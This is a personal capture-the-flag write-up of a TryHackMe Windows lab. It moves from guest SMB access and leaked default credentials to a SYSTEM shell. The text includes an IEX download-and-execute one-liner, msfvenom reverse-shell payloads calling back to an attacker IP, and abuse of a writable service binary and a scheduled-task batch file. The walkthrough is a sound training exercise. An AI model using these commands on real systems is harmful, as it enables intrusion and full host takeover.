---
lab: "Windows Jump"
date: "2026-09-20"
platform: "TryHackMe"
difficulty: "Medium"
---
# Room link: https://tryhackme.com/room/windowsjump

![](../Attachments/Pasted%20image%2020260923031220.png)

This is the flow of lateral movement.

![](../Attachments/Pasted%20image%2020260920202342.png)

```bash
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=privesc
| Not valid before: 2026-05-10T06:39:22
|_Not valid after:  2026-11-09T06:39:22
|_ssl-date: 2026-09-20T12:48:57+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: PRIVESC
|   NetBIOS_Domain_Name: PRIVESC
|   NetBIOS_Computer_Name: PRIVESC
|   DNS_Domain_Name: privesc
|   DNS_Computer_Name: privesc
|   Product_Version: 10.0.17763
|_  System_Time: 2026-09-20T12:48:49+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Scan shows notable ports open: 

- `SMB:445`
- `RDP:3389`
- `WinRM:5985`
- `RPC:135`

###### RPC

```bash
$ rpcclient -U "" -N 10.48.134.51                               
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
```

Null session is disabled for RPC. 
###### SMB 

The first user is guest, I will try to access shares as `guest`.

```bash
$ nxc smb 10.48.134.51 -u "guest" -p "" --shares

SMB         10.48.134.51    445    PRIVESC          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRIVESC) (domain:privesc) (signing:False) (SMBv1:None)
SMB         10.48.134.51    445    PRIVESC          [+] privesc\guest: 
SMB         10.48.134.51    445    PRIVESC          [*] Enumerated shares
SMB         10.48.134.51    445    PRIVESC          Share           Permissions     Remark
SMB         10.48.134.51    445    PRIVESC          -----           -----------     ------
SMB         10.48.134.51    445    PRIVESC          ADMIN$                          Remote Admin
SMB         10.48.134.51    445    PRIVESC          C$                              Default share
SMB         10.48.134.51    445    PRIVESC          IPC$            READ            Remote IPC
SMB         10.48.134.51    445    PRIVESC          Public          READ            Public file share

```

This shows that `guest` have a `READ` permission on share `Public`. 

```bash
$ smbclient //10.48.134.51/Public -U guest -p ""
Password for [WORKGROUP\guest]:

smb: \> ls
  .                                   D        0  Mon May 11 14:40:51 2026
  ..                                  D        0  Mon May 11 14:40:51 2026
  welcome.txt                         A      177  Mon May 11 14:40:50 2026

```

Within `Public` share, there is a text file called `welcome.txt`. I will transfer it to my attack machine to see its content.

```bash
$ cat welcome.txt
Welcome to CORP-NET.

New employee default credentials
================================
Username : thmuser
Password : {REDACTED}

Please change your password after first login.
```

I got the second user `thmuser` credentials. I assume this is `RDP credentials` to get inside the windows machine.

```bash
$ xfreerdp3 /v:10.48.134.51 /u:thmuser /p:{REDACTED} /dynamic-resolution +clipboard
```

```powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\thmuser.PRIVESC> whoami
privesc\thmuser
PS C:\Users\thmuser.PRIVESC> hostname
privesc
```

###### THMUSER Privileges

```powershell
PS C:\Users\thmuser.PRIVESC> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

###### THMUSER Groups

```powershell
PS C:\Users\thmuser.PRIVESC> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON  Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

###### THMUSER FLAG1

```powershell
PS C:\Users\thmuser\Desktop> type .\flag1.txt
THM{REDACTED}
```

I ran `Winpeas` using `ParsingPeas` so I can have the result in an html format for easy enumeration.

```powershell
PS C:\Users\thmuser\Desktop> powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.155.33:8005/get-script.ps1')"
[*] ParsingPeas - Automated Privilege Escalation Scanner
[*] Session ID: scan_20260920_131006_2604
[*] Hostname: PRIVESC
[*] Server: http://192.168.155.33:8005

[*] Detected: Windows system
[*] Downloading winpeas from Kali host...
[+] Downloaded successfully
[*] Running winpeas (this may take 2-5 minutes)...
[*] Winpeas may appear stuck for 30-60s during initial enumeration
[*] Output is being saved to file...

[*] Winpeas running (PID: 4312)...
```

Whilst scrubbing the `winpeas` output. I found `notadmin's credentials`.

```powershell
Looking for AutoLogon credentials (T1552.002)
    Some AutoLogon credentials were found
    DefaultUserName               :  notadmin
    DefaultPassword               :  {REDACTED}
```

We can manually get this by doing this commands.

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
```

With that, I used the credentials using `runas`.

```powershell
C:\Users\thmuser.PRIVESC>runas /user:notadmin cmd.exe
Enter the password for notadmin:
Attempting to start cmd.exe as user "PRIVESC\notadmin" ...
```

##### NOTADMIN Shell

```powershell
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
privesc\notadmin
```

##### NOTADMIN Flag2
```powershell
PS C:\Users\notadmin\Desktop> type .\flag2.txt
THM{REDACTED}
```

##### NOTADMIN Groups

```powershell
PS C:\Users\notadmin.PRIVESC> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

Nothing notable in here.

##### NOTADMIN Privileges 

```powershell
PS C:\Users\notadmin.PRIVESC> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

Also default permissions for `notadmin`. 

###### Checking for services owned by SVCADMIN

```powershell
PS C:\Users\thmuser\Desktop> Get-WmiObject win32_service | Where-Object {$_.StartName -match "svcadmin"}


ExitCode  : 1077
Name      : THMSvc
ProcessId : 0
StartMode : Manual
State     : Stopped
Status    : OK

```

So this process is owned by `svcadmin` and is currently `stopped`. I found where it is located and who has permissions on it.

```powershell
PS C:\Users\thmuser\Desktop> Get-WmiObject win32_service | Where-Object {$_.Name -eq "THMSvc"} | Select-Object PathName

PathName
--------
C:\Windows\THMSVC\svc.exe


PS C:\Users\thmuser\Desktop> icacls C:\Windows\THMSVC\svc.exe
C:\Windows\THMSVC\svc.exe Everyone:(F)
                          PRIVESC\notadmin:(I)(F)
                          BUILTIN\Administrators:(I)(F)
                          NT AUTHORITY\SYSTEM:(I)(F)
```

This shows that `notadmin`, my current user has full control over this file. I can try to create a `reverse shell` using `msfvenom` and try to overwrite the file and start the binary.

```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.155.33 LPORT=4444 -f exe > svc.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes
```

Transfer the file on the windows machine and overwrite the current `svc.exe`. 

```powershell
PS C:\Windows\THMSVC> copy-item C:\Toools\svc.exe .\svc.exe -Force
PS C:\Windows\THMSVC> Start-Service THMSvc
```

##### SVCADMIN Shell

Setup meterpreter listener using `exploit/multi/handler`.

```bash
msf > use exploit/multi/handler # Module

msf exploit(multi/handler) > set lhost 192.168.155.33
lhost => 192.168.155.33 # Attack host machine

msf exploit(multi/handler) > set lport 4444
lport => 4444 # Port

msf exploit(multi/handler) > set payload windows/shell_reverse_tcp
payload => windows/shell_reverse_tcp

msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.155.33:4444 
[*] Command shell session 2 opened (192.168.155.33:4444 -> 10.48.134.51:50951) at 2026-09-20 22:02:47 +0800


Shell Banner:
Microsoft Windows [Version 10.0.17763.1821]
-----
          

C:\Windows\system32>whoami
whoami
privesc\svcadmin # SVCADMIN User acquired.

```

##### SVCADMIN Flag3

```bash
C:\Users\svcadmin\Desktop>type flag3.txt
THM{REDACTED}
```

After enumerating for a while, I got something using `PowerUp.ps1` on the machine. 

```powershell
PS C:\Tools> . .\PowerUp.ps1
. .\PowerUp.ps1

PS C:\Tools> Invoke-AllChecks
Invoke-AllChecks


ServiceName                     : THMSvc
Path                            : C:\Windows\THMSVC\svc.exe
ModifiableFile                  : C:\Windows\THMSVC\svc.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : Everyone
StartName                       : .\svcadmin
AbuseFunction                   : Install-ServiceBinary -Name 'THMSvc'
CanRestart                      : True
Name                            : THMSvc
Check                           : Modifiable Service Files

ModifiablePath    : C:\Users\svcadmin.PRIVESC\AppData\Local\Microsoft\WindowsApps
IdentityReference : PRIVESC\svcadmin
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\svcadmin.PRIVESC\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\svcadmin.PRIVESC\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 
                    'C:\Users\svcadmin.PRIVESC\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

```

The first one is the `Service` that I abused to get shell as `svcadmin`.

The second one shows `DLL Hijacking`. So based on my research, the privileged service called `IKEEXT` which is basically `svchost.exe` will blindly load and execute the DLL with `NY AUTHORITY\SYSTEM` privilege.

I will try to do the same thing with the `THMSvc`. Creating a reverse shell payload inside a `DLL` file. 

```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.155.33 LPORT=5555 -f dll > wlbsctrl.dll
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of dll file: 9216 bytes
```

I realized that even if I managed to put the `DLL` on the writable `%PATH%`, I can't figure out which service use it. So I started a different approach.. `ScheduledTasks`.

Google shows that there are 2 common places where Scheduled tasks are found.

- Main Folder: `C:\Windows\System32\Tasks`
- Legacy Folder: `C:\Windows\Tasks`

I check both first before nit picking each and every item and the `C:Windows\Tasks` caught my attention because there's only one tasks on it.

```powershell
Directory: C:\Windows\Tasks

Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        5/11/2026   6:41 AM             41 cleanup.bat  

PS C:\Windows\Tasks> icacls cleanup.bat
cleanup.bat BUILTIN\Users:(I)(RX)
            PRIVESC\svcadmin:(I)(M)
            BUILTIN\Administrators:(I)(F)
            NT AUTHORITY\SYSTEM:(I)(F)

```

I can modify this batch file to run a program of mine as `NT AUTHORITY\SYSTEM`.

I recreated the `DLL payload` but as an `exe`.

```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.155.33 LPORT=5555 -f exe > endgame.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 7168 bytes
```

I put the payload on `C:\Tools\endgame.exe` and then edit the batch file

```powershell
PS C:\Windows\Tasks> Set-Content cleanup.bat "@echo off`nC:\Tools\endgame.exe`nexit /b 0"
```

Waited a minute, then I got `NT AUTHORITY\SYSTEM` shell. 

```powershell
[*] Command shell session 4 opened (192.168.155.33:5555 -> 10.49.189.154:50835) at 2026-09-20 23:57:05 +0800

Microsoft Windows [Version 10.0.17763.1821]
-----
          

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type C:\flag4.txt
THM{REDACTED}
```









